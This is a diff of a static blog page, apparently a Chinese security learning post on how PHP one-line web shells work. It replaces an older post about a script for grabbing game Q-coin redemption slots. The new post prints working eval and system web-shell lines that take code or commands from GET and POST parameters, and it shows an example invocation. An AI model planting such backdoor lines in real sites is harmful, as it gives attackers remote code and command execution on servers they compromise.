@@ -7,7 +7,7 @@
 <head>
   <meta charset="utf-8">
   
-  <title>易语言实现天刀兑换活动Q币 | Ryweer&#39;s Blog</title>
+  <title>自写菜刀之路——PHP一句话木马的实现原理与利用方法 | Ryweer&#39;s Blog</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -15,20 +15,21 @@
     <meta name="keywords" content="ryweer,信息安全，工具开发，漏洞分析，漏洞复线" />
   
 
-  <meta name="description" content="最近天刀新职业版本出了个活动可以使用活动Q兑换真实Q币，想想还是不错的。但是每天都抢不着是真的难受，为了应对脚本猖獗的游戏环境，我决定写个脚本来加入他们-0- 一个功能很单一的程序，软件支持自己设置提交次数，模拟浏览器登录。其他好像没什么了，简单测试了一下基本没啥大问题，但是应该还有些小bug，后边发现了再改吧。附上源代码。 点击下载">
+  <meta name="description" content="最近为了紧跟大佬室友的学习步伐，提高自身的开发能力，为日后坚持社会主义核心价值观提供知识技能支持，本菜皮皮踏上了自写菜刀的征程。这是大佬室友给的第一个学习建议，不敢懈怠，以前是没大佬指点，现在有了，我也想体会一下当大佬的感觉。 同时，在学习之余做下日常学习记录。都是基础知识，但基础很重要。 PHP一句话PHP一句话可分为eval和system两类。 12&amp;lt;?php @eval($_GET[&quot;">
 <meta name="keywords" content="信息安全，易语言，漏洞分析，漏洞复线">
 <meta property="og:type" content="article">
-<meta property="og:title" content="易语言实现天刀兑换活动Q币">
-<meta property="og:url" content="http://118.24.162.88/2018/07/05/易语言实现天刀兑换活动Q币/index.html">
+<meta property="og:title" content="自写菜刀之路——PHP一句话木马的实现原理与利用方法">
+<meta property="og:url" content="http://118.24.162.88/2018/07/18/自写菜刀之路——PHP一句话木马的实现原理与利用方法/index.html">
 <meta property="og:site_name" content="Ryweer&#39;s Blog">
-<meta property="og:description" content="最近天刀新职业版本出了个活动可以使用活动Q兑换真实Q币，想想还是不错的。但是每天都抢不着是真的难受，为了应对脚本猖獗的游戏环境，我决定写个脚本来加入他们-0- 一个功能很单一的程序，软件支持自己设置提交次数，模拟浏览器登录。其他好像没什么了，简单测试了一下基本没啥大问题，但是应该还有些小bug，后边发现了再改吧。附上源代码。 点击下载">
+<meta property="og:description" content="最近为了紧跟大佬室友的学习步伐，提高自身的开发能力，为日后坚持社会主义核心价值观提供知识技能支持，本菜皮皮踏上了自写菜刀的征程。这是大佬室友给的第一个学习建议，不敢懈怠，以前是没大佬指点，现在有了，我也想体会一下当大佬的感觉。 同时，在学习之余做下日常学习记录。都是基础知识，但基础很重要。 PHP一句话PHP一句话可分为eval和system两类。 12&amp;lt;?php @eval($_GET[&quot;">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://118.24.162.88/2018/07/05/易语言实现天刀兑换活动Q币/1.png">
-<meta property="og:updated_time" content="2018-07-05T06:27:00.734Z">
+<meta property="og:image" content="http://118.24.162.88/2018/07/18/自写菜刀之路——PHP一句话木马的实现原理与利用方法/cut1.jpg">
+<meta property="og:image" content="http://118.24.162.88/2018/07/18/自写菜刀之路——PHP一句话木马的实现原理与利用方法/cut2.jpg">
+<meta property="og:updated_time" content="2018-07-18T03:01:46.246Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="易语言实现天刀兑换活动Q币">
-<meta name="twitter:description" content="最近天刀新职业版本出了个活动可以使用活动Q兑换真实Q币，想想还是不错的。但是每天都抢不着是真的难受，为了应对脚本猖獗的游戏环境，我决定写个脚本来加入他们-0- 一个功能很单一的程序，软件支持自己设置提交次数，模拟浏览器登录。其他好像没什么了，简单测试了一下基本没啥大问题，但是应该还有些小bug，后边发现了再改吧。附上源代码。 点击下载">
-<meta name="twitter:image" content="http://118.24.162.88/2018/07/05/易语言实现天刀兑换活动Q币/1.png">
+<meta name="twitter:title" content="自写菜刀之路——PHP一句话木马的实现原理与利用方法">
+<meta name="twitter:description" content="最近为了紧跟大佬室友的学习步伐，提高自身的开发能力，为日后坚持社会主义核心价值观提供知识技能支持，本菜皮皮踏上了自写菜刀的征程。这是大佬室友给的第一个学习建议，不敢懈怠，以前是没大佬指点，现在有了，我也想体会一下当大佬的感觉。 同时，在学习之余做下日常学习记录。都是基础知识，但基础很重要。 PHP一句话PHP一句话可分为eval和system两类。 12&amp;lt;?php @eval($_GET[&quot;">
+<meta name="twitter:image" content="http://118.24.162.88/2018/07/18/自写菜刀之路——PHP一句话木马的实现原理与利用方法/cut1.jpg">
 
   
 
@@ -152,17 +153,22 @@
 </div>
 
 
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP一句话"><span class="toc-text">PHP一句话</span></a></li></ol>
+  </div>
+
 
 
 <div class="content content-post CENTER">
-   <article id="post-易语言实现天刀兑换活动Q币" class="article article-type-post" itemprop="blogPost">
+   <article id="post-自写菜刀之路——PHP一句话木马的实现原理与利用方法" class="article article-type-post" itemprop="blogPost">
   <header class="article-header">
-    <h1 class="post-title">易语言实现天刀兑换活动Q币</h1>
+    <h1 class="post-title">自写菜刀之路——PHP一句话木马的实现原理与利用方法</h1>
 
     <div class="article-meta">
       <span>
         <i class="icon-calendar"></i>
-        <span>2018.07.05</span>
+        <span>2018.07.18</span>
       </span>
 
       
@@ -175,7 +181,7 @@
       
   <span class="article-category">
     <i class="icon-list"></i>
-    <a class="article-category-link" href="/categories/编程日常/">编程日常</a>
+    <a class="article-category-link" href="/categories/学习日常/">学习日常</a>
   </span>
 
 
@@ -195,9 +201,23 @@
 
   <div class="article-content">
     
-      <p>最近天刀新职业版本出了个活动可以使用活动Q兑换真实Q币，想想还是不错的。但是每天都抢不着是真的难受，为了应对脚本猖獗的游戏环境，我决定写个脚本来加入他们-0-</p>
-<p>一个功能很单一的程序，软件支持自己设置提交次数，模拟浏览器登录。其他好像没什么了，简单测试了一下基本没啥大问题，但是应该还有些小bug，后边发现了再改吧。<br><img src="/2018/07/05/易语言实现天刀兑换活动Q币/1.png" alt="程序截图"><br>附上源代码。</p>
-<p><a href="兑Q币.e">点击下载</a></p>
+      <p>最近为了紧跟大佬室友的学习步伐，提高自身的开发能力，为日后坚持社会主义核心价值观提供知识技能支持，本菜皮皮踏上了自写菜刀的征程。这是大佬室友给的第一个学习建议，不敢懈怠，以前是没大佬指点，现在有了，我也想体会一下当大佬的感觉。</p>
+<p>同时，在学习之余做下日常学习记录。都是基础知识，但基础很重要。</p>
+<h3 id="PHP一句话"><a href="#PHP一句话" class="headerlink" title="PHP一句话"></a>PHP一句话</h3><p>PHP一句话可分为eval和system两类。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="string">"code"</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @system($_POST[<span class="string">"cmd"</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>那么用eval和system有什么区别呢？在这里大概说一说，应为对这类脚本语言都不熟悉，就只能说说自己了解的。</p>
+<p>eval()是把其中的参数按照PHP代码来解析，因此eval()函数后跟的都必须是合法的PHP代码，切必须以分号结尾。</p>
+<p>使用eval()函数的一句话实现菜刀的功能：</p>
+<p><img src="/2018/07/18/自写菜刀之路——PHP一句话木马的实现原理与利用方法/cut1.jpg" alt=""></p>
+<p>code参数后边直接跟PHP代码就可以执行了，记得以分号结尾。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell1.php?code=phpinfo();</span><br></pre></td></tr></table></figure>
+<p>再说system()函数，PHP中system()函数的参数是直接跟具体命令而不是PHP代码。举个例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @system($_GET[<span class="string">"code"</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>对于这样的一句话，通过GET方法提交参数后的效果如下图：</p>
+<p><img src="/2018/07/18/自写菜刀之路——PHP一句话木马的实现原理与利用方法/cut2.jpg" alt=""></p>
+<p>可以看到，code参数直接赋值具体命令就可以完成命令执行了。总结一下就是eval()函数是代码执行，system()函数是命令执行。</p>
+<p>当然现在直接使用这两个函数的一句话基本看不到了，毕竟特征太明显了，大部分情况下都会被拦截。但高深的一句话用法以后再讨论了，当下还是要先写菜刀。。。。</p>
+<p><a href="http://www.cnblogs.com/KevinGeorge/p/8127054.html" target="_blank" rel="noopener">参考文章链接</a></p>
 
     
   </div>
@@ -228,10 +248,10 @@
 
    
   <div class="box-prev-next clearfix">
-    <a class="show pull-left" href="/2018/07/04/Ubuntu DOS界面使用中文输入法/">
+    <a class="show pull-left" href="/2018/07/05/易语言实现天刀兑换活动Q币/">
         <i class="icon icon-angle-left"></i>
     </a>
-    <a class="show pull-right" href="/2018/07/18/自写菜刀之路——PHP一句话木马的实现原理与利用方法/">
+    <a class="show pull-right" href="/2018/07/18/PhpMyadmin命令执行漏洞（CVE-2016-5734）/">
         <i class="icon icon-angle-right"></i>
     </a>
   </div>
